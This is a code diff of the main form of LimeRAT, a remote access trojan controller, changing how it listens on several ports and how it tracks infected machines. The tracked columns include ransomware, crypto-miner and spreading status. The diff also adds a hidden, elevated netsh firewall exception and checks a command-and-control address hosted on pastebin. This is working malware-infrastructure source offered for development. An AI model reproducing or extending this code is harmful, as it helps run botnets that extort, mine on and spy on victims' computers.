@@ -46,20 +46,25 @@ Public Class Main
 
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
+        ' MetroLabel3.Text = Nothing
         Try : PingClients.Interval = My.Settings.PING_VALUE * 1000 : Catch : End Try
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
         Try
-            Dim BotList() As String = IO.File.ReadAllLines("MISC/USERS.dat")
-            For Each line As String In BotList
-                Dim lineArray() As String = Split(line, "<<#>>")
-                Dim bot = L1.Items.Add(lineArray(0))
-                bot.ForeColor = Color.Red
-                For i As Integer = 1 To lineArray.Length - 1
-                    bot.SubItems.Add(lineArray(i))
-                Next
-            Next
-            L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+            If IO.File.Exists("MISC/USERS.dat") Then
+                Dim BotList() As String = IO.File.ReadAllLines("MISC/USERS.dat")
+                If BotList.Contains("<<#>>") Then
+                    For Each line As String In BotList
+                        Dim lineArray() As String = Split(line, "<<#>>")
+                        Dim bot = L1.Items.Add(lineArray(0))
+                        bot.ForeColor = Color.Red
+                        For i As Integer = 1 To lineArray.Length - 1
+                            bot.SubItems.Add(lineArray(i))
+                        Next
+                    Next
+                    L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                End If
+            End If
         Catch ex As Exception
         End Try
 
@@ -83,7 +88,7 @@ Public Class Main
             For Each x As ListViewItem In L1.Items
                 myWriter.WriteLine(x.Text & SPL & x.SubItems(1).Text & SPL & x.SubItems(2).Text & SPL _
                                    & x.SubItems(3).Text & SPL & x.SubItems(4).Text & SPL & x.SubItems(5).Text & SPL & x.SubItems(6).Text & SPL _
-                                   & x.SubItems(7).Text & SPL & x.SubItems(8).Text & SPL & x.SubItems(9).Text & SPL & x.SubItems(10).Text & SPL & "Offline" & SPL & x.SubItems(12).Text)
+                                   & x.SubItems(7).Text & SPL & x.SubItems(8).Text & SPL & x.SubItems(9).Text & SPL & x.SubItems(10).Text & SPL & x.SubItems(11).Text & SPL & "Offline" & SPL & x.SubItems(12).Text)
             Next
             myWriter.Close()
         Catch ex As Exception
@@ -98,55 +103,66 @@ Public Class Main
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Main_Rightclick.Renderer = New MyRenderer()
-        Dim Client As Net.Sockets.TcpClient = Nothing
-        Try
-            If GetExternalAddress() = "127.0.0.1" Then
-                MetroLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & S_Settings.PORT & " #" & S_Settings.EncryptionKey & "]"
-                MetroLabel3.ForeColor = Color.Lime
-                Messages("{ Established! }", "Localhost")
-            Else
-                Client = New Net.Sockets.TcpClient
-                Client.Connect(GetExternalAddress, S_Settings.PORT)
-                MetroLabel3.Text = "LISTENING [" & GetExternalAddress() & " @" & S_Settings.PORT & " #" & S_Settings.EncryptionKey & "]"
-                MetroLabel3.ForeColor = Color.Lime
-                Messages("{ Established! }", "Connection is established")
-            End If
-        Catch ex As Net.Sockets.SocketException
-            MetroProgressSpinner1.Spinning = False
-            MetroLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & S_Settings.PORT & "  #" & S_Settings.EncryptionKey & "]"
-            MetroLabel3.ForeColor = Color.Red
-            Messages("{ Established! }", "But port " & S_Settings.PORT & " seems to be blocked")
-            Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
-            Dim result As DialogResult = MessageBox.Show("Port " & S_Settings.PORT & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
-            If result = DialogResult.Yes Then
-                Try
-                    Dim process As New Process()
-                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
-                    process.StartInfo.FileName = "cmd.exe"
-                    process.StartInfo.UseShellExecute = True
-                    process.StartInfo.Verb = "runas"
-                    process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
-                    process.Start()
-                    process.WaitForExit()
-                    Process.Start(Application.ExecutablePath)
-                    End
-                Catch ex1 As Exception
-                End Try
-            End If
-        Finally
-            Try : Client.Close() : Catch : End Try
-        End Try
 
         Try
             Using WC As New Net.WebClient()
                 Dim reply As String = WC.DownloadString("https://pastebin.com/raw/9kHA6nwH")
                 If reply <> S_Settings.StubVer Then
                     Messages("{ New update is available! }", "github.com/NYAN-x-CAT/Lime-RAT/releases")
-                    WC.Dispose()
+                ElseIf reply = S_Settings.StubVer Then
+                    Messages("{ You are using the latest version! }", "Found bug? Email NYANxCAT@pm.me")
                 End If
+                WC.Dispose()
             End Using
         Catch ex As Exception
         End Try
+
+
+        Dim Client As Net.Sockets.TcpClient = Nothing
+        Dim PortLabel As New Text.StringBuilder
+        For Each ThePort In S_Settings.PORT
+            Try
+                If GetExternalAddress() = "127.0.0.1" Then
+                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
+                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
+                    MetroLabel3.ForeColor = Color.Lime
+                Else
+                    Client = New Net.Sockets.TcpClient
+                    Client.Connect(GetExternalAddress, ThePort)
+                    PortLabel.Append(String.Format(" {0}=OPENED ", ThePort))
+                    MetroLabel3.Text = String.Format("IP={0} {1} KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
+                    MetroLabel3.ForeColor = Color.Lime
+                End If
+            Catch ex As Net.Sockets.SocketException
+                MetroProgressSpinner1.Spinning = False
+                PortLabel.Append(String.Format(" {0}=CLOSED ", ThePort))
+                MetroLabel3.Text = String.Format("IP={0}  {1}  KEY={2}", GetExternalAddress, PortLabel.ToString, S_Settings.EncryptionKey)
+                MetroLabel3.ForeColor = Color.Red
+                Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+
+                If GTV("FW") = Nothing Then
+                    Dim result As DialogResult = MessageBox.Show("Port " & ThePort & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
+                    If result = DialogResult.Yes Then
+                        Try
+                            STV("FW", "1")
+                            Dim process As New Process()
+                            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                            process.StartInfo.FileName = "cmd.exe"
+                            process.StartInfo.UseShellExecute = True
+                            process.StartInfo.Verb = "runas"
+                            process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
+                            process.Start()
+                            process.WaitForExit()
+                            Process.Start(Application.ExecutablePath)
+                            End
+                        Catch ex1 As Exception
+                        End Try
+                    End If
+                End If
+            Finally
+                Try : Client.Close() : Catch : End Try
+            End Try
+        Next
 
     End Sub
 
@@ -267,9 +283,11 @@ Public Class Main
                                 L1.Items(i).SubItems(RANS.Index).Text = A(7)
                                 L1.Items(i).SubItems(XMR.Index).Text = A(8)
                                 L1.Items(i).SubItems(SP.Index).Text = A(9)
+                                L1.Items(i).SubItems(_PORT.Index).Text = A(10)
+                                L1.Items(i).SubItems(DotNET.Index).Text = A(11)
                                 L1.Items(i).SubItems(PING.Index).Text = "Online"
                                 L1.Items(i).ForeColor = Nothing
-                                L1.Items(i).ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13))
+                                L1.Items(i).ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15))
                                 Messages("{" + S.IP(u) + "}", "Reconnected")
 
                                 Try
@@ -282,6 +300,7 @@ Public Class Main
                                     End If
                                 Catch ex As Exception
                                 End Try
+                                L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                 Exit Select
                             End If
                         Next
@@ -290,11 +309,11 @@ Public Class Main
 
                         Dim L = L1.Items.Add(_Gio.LookupCountryName(S.IP(u)), _Gio.LookupCountryCode(S.IP(u)) & ".png")
                         L.Tag = u
-                        Try : L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(12), A(13)) : Catch : End Try
+                        Try : L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15)) : Catch : End Try
                         L.SubItems.Add(S.IP(u))
 
                         For i As Integer = 1 To A.Length - 1
-                            If i = 12 Then Exit For
+                            If i = 15 Then Exit For
                             L.SubItems.Add(A(i))
                         Next
 
@@ -1906,8 +1925,8 @@ Public Class Main
     Private Sub ClientFolderToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClientFolderToolStripMenuItem1.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-                Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
-            Next
+            Process.Start(uFolder(x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text, ""))
+        Next
     End Sub
 
     Private Sub RemoveOfflineToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveOfflineToolStripMenuItem.Click
@@ -2164,14 +2183,10 @@ Public Class Main
             x = wc.DownloadString(_pastebin.Text)
 
             If rx.IsMatch(x.Split(":")(0)) AndAlso x.Split(":")(1) <= 65535 Then
-                If x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
+                If x.Split(":")(0) = GetExternalAddress() AndAlso S_Settings.PORT.Contains(x.Split(":")(1)) Then
                     MsgBox("Valid! " + x, MsgBoxStyle.Information)
-                ElseIf x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
-                    MsgBox(x + Environment.NewLine + "port doesn't match your current port", MsgBoxStyle.Exclamation)
-                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
-                    MsgBox(x + Environment.NewLine + "IP doesn't match your current IP", MsgBoxStyle.Exclamation)
-                ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
-                    MsgBox(x + Environment.NewLine + "IP and port doesn't match your current settings", MsgBoxStyle.Critical)
+                Else
+                    MsgBox(x + Environment.NewLine + "IP or port doesn't match your current settings", MsgBoxStyle.Critical)
                 End If
             Else
                 MsgBox("Wrong format", MsgBoxStyle.Critical)
